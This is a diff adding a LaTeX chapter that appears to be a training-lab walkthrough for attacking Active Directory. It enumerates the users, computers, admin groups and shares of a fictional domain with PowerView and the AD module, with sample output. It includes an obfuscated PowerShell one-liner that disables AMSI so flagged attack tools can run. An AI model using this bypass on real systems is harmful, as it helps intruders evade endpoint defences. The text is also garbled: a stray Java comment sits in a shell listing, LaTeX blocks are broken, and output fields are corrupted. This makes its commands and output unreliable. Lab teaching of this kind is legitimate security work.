@@ -1,0 +1,232 @@
+\chapter{Scripts and Code to Attack and Defend Active Directory}
+
+\section{Learning Objective 1:}
+\subsection{Task}
+\begin{itemize}
+    \item Our task here is to enumerate the following for the "hackherway" domain. Specifically, we will be enumerating the following below:
+    \begin{itemize}
+        \item Users
+        \item Computers
+        \item Domain Administrators
+        \item Enterprise Administrators
+        \item Network Shares
+    \end{itemize}
+\end{itemize}
+
+\subsection{Solution}
+We can use the PowerView tool from PowerSploit to enumerate the domain. Please note that all the enumeration can be done with Microsoft's Active Directory module as well.
+
+\subsection{Using PowerView}
+From a PowerShell session, elevate administrator, and run the following commands:
+\begin{lstlisting}
+// Hello.java
+PS C:\> cd \<location of where PowerView is saved>
+PS C:\MyDrive\MyTools> powershell -ep bypass
+
+Windpws PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+\end{lstlisting}
+Next, we need to bypass AMSI as PowerView may be flagged as malicious:
+\verb|PS C:\MyDrive\MyTools>S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "\{1\}{0\}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe" ( "\{6\}{3\}{1\}{4\}{2\}{0\}{5\}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) ."g`etf`iElD"( ( "\{0\}{2\}{1\}" -f('a'+'msi'),'d',(('I'+'nitF'+'aile') ),( "\{2\}{4\}{0\}{1\}{3\}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( \${n`ULl\},\${t`RuE\}}}}|
+Now, load the PowerView script using dot sourcing as such:
+\texttt{PS C:\MyDrive\MyTools> _ C:\MyDrive\MyTools\PowerView.ps1
+PS C:\MyDrive\MyTools> Get-NetUser
+
+logoncount              : 29906
+badpasswordtime         : 08/12/2025 1:21:07 PM
+description             : Built-in account for administering the computer/domain
+distinguishedname       : CN=Administrator,CN=Users,DC=hackherway,DC=hackherspace,DC=local
+objectclass             : {top, person, organizationalPerson, user}
+lastlogontimestamp      : 2/4/2025 8:01:30 AM
+name                    : Administrator
+objectsid               : S-1-5-21-1874506631-3219952063-538504511-500
+samaccountname          : Administrator
+admincount              : 1
+codepage                : 0
+samaccountype           : 80530668
+whenchanged             : 2/5/2025 4:01:30 AM
+accountexpires          : 9223372936854775807
+countrycode             : 0
+adspath                 : LDAP://CN=Administrator,CN=Users,DC=hackherway,DC=hackherspace,DC=local
+instancetype            : 4
+objectguid              : e88d11d3-3e60-4a68-b46a-94ff32b7c8cf
+lastlogon               : 2/5/2025 9:10:00 AM
+lastlogoff              : 12/31/1600 4:00:00 PM
+objectcategory          : CN=Person,CN=Schema,CN=Configuration,DC=hackherspace,DC=local
+dscorepropagationdata   : (5/3/2025 9:04:05 AM, 2/21/2024 12:17:00 PM, 2/19/2024 1:04:02 PM, 2/19/2024 12:55:49 PM...)
+memberof                : {CN=Group Policy Creator Owners,CN=Users,DC=hackherway,DC=hackherspace,DC=local, CN=Domain Admins, CN=Users,DC=hackherway,DC=hackherspace,DC=local, CN=Administrators,CN=Builtin,DC=hackherway,DC=hackherspace,DC=local}
+whencreated             : 2/17/2019 7:00:16 AM
+iscriticalsystemobject  : True
+badpwdcount             : 0
+cn                      : Administrator
+useraccountcontrol      : 66048
+usncreated              : 8196
+pwdlastset              : 2/16/2019 9:14:11 PM
+usnchanged              : 517082
+[snip]
+
+To list a specifc property of all the users, we can use the \texttt{select-object} (or its alias \texttt{select}) cmdlet. For example, to list only the \texttt{samaccountname}, run the following command below:
+\texttt{PS C:\MyDrive\MyTools> Get-NetUser | select -ExpandProperty samaccountname
+Administrator
+Guest
+DefaultAccount
+krbtgt
+ciadmin
+sqladmin
+srvadmin
+mgmtadming
+appadmin
+sql1admin
+svcadmin
+testda
+[snip]
+}
+Now, to enumerate member machines in the domain, we can use the \texttt{Get-NetComputer} command as such:
+\texttt{PS C:\MyDrive\MyTools> Get-NetComputer
+dcorp-dc.hackherway.hackherspace.local
+dcorp-mssql.hackherway.hackherspace.local
+dcorp-ci.hackherway.hackherspace.local
+dcorp-mgmt.hackherway.hackherspace.local
+dcorp-appsrv.hackherway.hackherspace.local
+dcorp-adminsrv.hackherway.hackherspace.loccal
+dcorp-sql1.hackherway.hackherspace.local
+[snip]
+}
+To see the attributes of the Domain Admins group:
+\texttt{PS C:\MyDrive\MyTools> Get-NetGroup -GroupName "Domain Admins" -FullData}
+grouptype               : -2147483646
+admincount              : 1
+iscriticalsystemobject  : True
+samaccountype           : 268435456
+samaccountname          : Domain Admins
+whenchanged             : 2.17/2025 2:22:52 PM
+objectsid               : S-1-5-21-1874506631-3219952063-538504511-512
+objectclass             : {top, group}
+cn                      : Domain Admins
+usnchanged              : 15057
+dscorepropagationdata   : (5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...)
+memberof                : {CN=Denied RODC Password Replication Group,CN=Users,DC=hackherway,DC=hackherspace,DC=local,CN=Administrators,CN=Builtin,DC=hackherway,DC=hackherspace,DC=local}
+adspath                 : LDAP://CN=Domain Admins,CN=Users,DC=hackherway,DC=hackherspace,DC=local
+description             : Designated administrators of the domain
+distinguishedname       : CN=Domain Admins,CN=Users,DC=hackherway,DC=hackherspace,DC=local
+name                    : Domain Admins
+member                  : {CN=svcadmin,CN=Users,DC=hackherway,DC=hackherspace,DC=local,CN=Administrator,CN=Users,DC=hackherway,DC=hackherspace,DC=local}
+usncreated              : 12315
+whencreated             : 2/17/2019 7:01:46 AM
+instancetype            : 4
+objectguid              : d80da75d-3946-4c58-b26d-5406e67bbc10
+objectcategory          : CN=Group,CN=Schema,CN=Configuration,DC=hackherspace,DC=local
+To enumerate members of the Domain Admins Group:
+\texttt{PS C:\MyDrive\MyTools> Get-NetGroupMember -GroupName "Domain Admins"}
+
+GroupDomain         : hackherway.hackherspace.local
+GroupName           : Domain Admins
+MemberDomain        : hackherway.hackherspace.local
+MemberName          : svcadmin
+MemberSID           : S-1-5-21-1874506631-3219952063-538504511-1122
+IsGroup             : False
+MemberDN            : CN=svc admin,CN=Users,DC=hackherway,DC=hackherspace,DC=local
+
+GroupDomain         : hackherway.hackherspace.local
+GroupName           : Domain Admins
+MemberDomain        : hackherway.hackherspace.local
+MemberName          : Administrator
+MemberSID           : S-1-5-21-1874506631-3219952063-538504511-500
+IsGroup             : False
+MemberDN            : CN=Administrator,CN=Users,DC=hackherway,DC=hackherspace,DC=local
+\begin{verbatim}
+svcadmin
+testda
+[snip]
+\end{verbatim}
+To enumerate members of the Enterprise Admins group:
+\texttt{PS C:\MyDrive\MyTools> Get-NetGroupMember -GroupName "Enterprise Admins"}
+
+Since this is not a root domain, the above command will return you to the command prompt. We first need to query the root domain as the Enterprise Admins group is only present within the root of a forest.
+\texttt{PS C:\MyDrive\MyTools> Get-NetGroupMember -GroupName "Enterprise Admins" -Domain hackherspace.local
+
+GroupDomain         : hackherspace.local
+GroupName           : Enterprise Admins
+0MemberDomain       : hackherspace.local
+MemberName          : Administrator
+MemberSID           : S-1-5-21-2805344878-1496970234-7007674226-500
+IsGroup             : False
+MemberDN            : CN=Administrator,CN=Users,DC=hackherspace,DC=local
+}
+To find interesting shares:
+PS C:\MyDrive\MyTools> Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
+VERBOSE: [*] Running Invoke-ShareFinder with delay of 0
+VERBOSE: [*] Querying domain hackherway.hackherspace.local for hosts
+VERBOSE: Get-DomainSearcher search string: LDAP://dcorp-dc.hackherway.hackherspace.local/DC=hackherway,DC=hackherspace,DC=local
+VERBOSE: Get-NetComputer filter : ' (\&(sAMAccountType=805306369) (dnshostname=*))'
+VERBOSE: [*] Total number of hosts : 23
+VERBOSE: Waiting for threads to finish...
+VERBOSE: All threads completed!
+VERBOSE: [*] Total number of active hosts: 8
+VERBOSE: [*] Enumerating server dcorp-appsrv.hackherway.hackherspace.local (1 of 8)
+VERBOSE: [*] Server share: @{shi1_netname=ADMIN\$; shi1_type=2147483648; shi1_remark=Remote Admin; ComputerName=dcorp-appsrv.hackherway.hackherspace.local}
+VERBOSE: [*] Server share: @shi1_netname=C\$; shi1_type=2147483648; shi1_remark=Default share; ComputerName=dcorp-appsrv.hackherway.hackherspace.local
+{VERBOSE: [*] Server share: @{shi1_netname=C\$; shi1_type=shi1_type=2147483648; shi1_remark=Default share; ComputerName=dcorp-dc.hackherway.hackherspace.local}
+VERBOSE: [*] Server share: @{shi1_netname=IPC\$; shi1_type=2147483651; shi1_remark=Remote IPC; ComputerName=dcorp-dc.hackherway.hackherspace.local}
+VERBOSE: [*] Server share: @{shi1_netname=NETLOGON; shi1_type=0; shi1_remark=Logon server share; ComputerName=dcorp-dc.hackherway.hackherspace.local}
+\\dcorp-dc.hackherway.hackherspace.local\NETLOGON - Logon server share
+VERBOSE: [*] Server share: @{shi1_netname=SYSVOL; shi1_type=shi1_type=0; shi1_remark=Logon server share; ComputerName=dcorp-dc.hackherway.hackherspace.local}
+\\dcorp-dc.hackherway.hackherspace.local\SYSVOL - Logon server share
+VERBOSE: [*] Enumerating server dcorp-sql1.hackherway.hackherspace.local (3 of 8)
+VERBOSE: [*] Server share: @{shi1_netname=ADMIN\$; shi1_type=shi1_type=2147483648; shi1_remark=Remote admin; ComputerName=dcorp-sql1.hackherway.hackherspace.local}
+VERBOSE: [*] Server share: @{shi1_netname=C\$; shi1_type=shi1_type=2147483648; shi1_remark=Default share; ComputerName=dcorp-sql1.hackherway.hackherspace.local}
+VERBOSE: [*] Server share: @{shi1_netname=IPC\$; shi1_type=shi1_type=2147483651; shi1_remark=Remote IPC; ComputerName=dcorp-sql1.hackherway.hackherspace.local}
+VERBOSE: [*] Enumerating server dcorp-adminsrv.hackherway.hackherspace.local (6 of 8)
+VERBOSE: [*] Server share: @{shi1_netname=ADMIN\$; shi1_type=shi1_type=2147483648; shi1_remark=Remote Admin; ComputerName=dcorp-adminsrv.hackherway.hackherspace.local}
+VERBOSE: [*] Server share: @{shi1_netname=C\$; shi1_type=shi1_type=2147483648; shi1_remark=Default share; ComputerName=dcorp-adminsrv.hackherway.hackherspace.local}
+VERBOSE: [*] Server share: @{shi1_netname=ADIPCMIN\$; shi1_type=shi1_type=2147483651; shi1_remark=Remote IPC; ComputerName=dcorp-adminsrv.hackherway.hackherspace.local}
+[snip]
+}
+\subsection{Using the Active Directory Module (ADModule)}
+Now, we can now import the ADModule. Remember to use it from a different PowerShell session. If you load PowerView and the ADModule in the same PowerShell session, some functions will not work:
+\begin{lstlisting}
+PS C:\MyDrive\MyTools> Import-Module C:\MyDrive\MyTools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
+PS C:\MyDrive\MyTools> Import-Module C:\MyDrive\MyTools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
+\end{lstlisting}
+Enumerate all the users in the current domain using the ADModule we just imported from above as such:
+\begin{lstlisting}
+PS C:\MyDrive\MyTools> Get-ADUser -Filter *
+
+DistinguishedName   : CN=Administrator,CN=Users,DC=hackherway,DC=hackherspace.local
+Enabled             : True
+GivenName           :
+Name                : Administrator
+ObjectClass         : User
+ObjectGUID          : 1874506631-3219952063-538504511-500
+Surname             :
+UserPrincipalName   :
+DistinguishedName   : CN=Guest,CN=Users,DC=hackherway,DC=hackherspace,DC=local
+Enabled                 : False
+GivenName               :
+Name                    : Guest
+ObjectClass             : user
+ObjectGUID              : 1ac1cc56-9c7d-4450-a648-512a92f68cb1
+SamAccountName          : Guest
+SID                     : S-1-5-21-1874506631-3219952063-538504511-501
+Surname                 :
+UserPrincipalName       :
+[snip]
+\end{lstlisting}
+We can list specific properties. Let us list the sAMAccountname and description for the users. Note that we are actually listing all of the properties first using the \texttt{-Properties} parameter as such:
+\begin{lstlisting}
+PS C:\MyDrive\MyTools> Get-ADUser -Filter * -Properties *| select
+Samaccountname, Description
+
+Samaccountname  Description
+Administrator   Built-in account for administering the computer/domain
+Guest           Built-in account for guest access to the computer/domain
+DefaultAccount  A user account managed by the sysatem
+krbtgt          Key Distribution Center Service Account
+\end{lstlisting}
+For the next task, we will list the computers:
+\begin{lstlisting}
+PS C:\MyDrive\MyTools> Get-ADComputer -Filter *
+
+DistinguishedName       : CN=DCORP-DC,OU=Domain Controllers,DC=hackherway,DC=hackherspace,DC=local
+DNSHostName             : dcorp
+\end{lstlisting}
